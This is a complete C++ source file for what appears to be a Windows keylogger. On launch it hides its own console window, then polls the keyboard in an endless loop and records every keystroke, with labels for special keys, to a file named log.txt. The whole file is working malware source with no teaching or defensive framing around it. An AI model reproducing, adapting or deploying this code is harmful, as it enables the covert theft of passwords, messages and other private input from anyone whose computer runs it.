#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <string>
#include <fstream>
#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Advapi32.lib")
using namespace std;

void Log(string input)
{
    fstream fp;
    fp.open("log.txt", fstream::app);
    if (fp.is_open()) {
        fp << input;
        fp.close();
    }
}

bool SpecialKey(int key)
{
    switch (key) {
        case VK_SPACE:
            Log(" ");
            return true;
        case VK_RETURN:
            Log("\n");
            return true;
        case VK_SHIFT:
            Log("[SHIFT]");
            return true;
        case VK_BACK:
            Log("[BACKSPACE]");
            return true;
        case VK_RBUTTON:
            Log("[R_CLICK]");
            return true;
        case VK_CAPITAL:
            Log("[CAPS_LOCK]");
            return true;
        case VK_TAB:
            Log("[TAB]");
            return true;
        case VK_UP:
            Log("[UP]");
            return true;
        case VK_DOWN:
            Log("[DOWN]");
            return true;
        case VK_LEFT:
            Log("[LEFT]");
            return true;
        case VK_RIGHT:
            Log("[RIGHT]");
            return true;
        case VK_CONTROL:
            Log("[CTRL]");
            return true;
        case VK_MENU:
            Log("[ALT]");
            return true;
        default:
            return false;
    }
}

int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    char key = 'x';
    bool caps = false;

    while (true) {
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                if (SpecialKey(key) == false) {

                // check if caps lock
                bool caps = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

                fstream fp;
                fp.open("log.txt", fstream::app);
                if (fp.is_open()) {
                    if (!caps && key >= 0x41 && key <= 0x5a)
                        key += 0x20;      // lower letter
                    fp << char(key);
                    fp.close();
                    }
                }
            }
        }
    }

    return 0;
}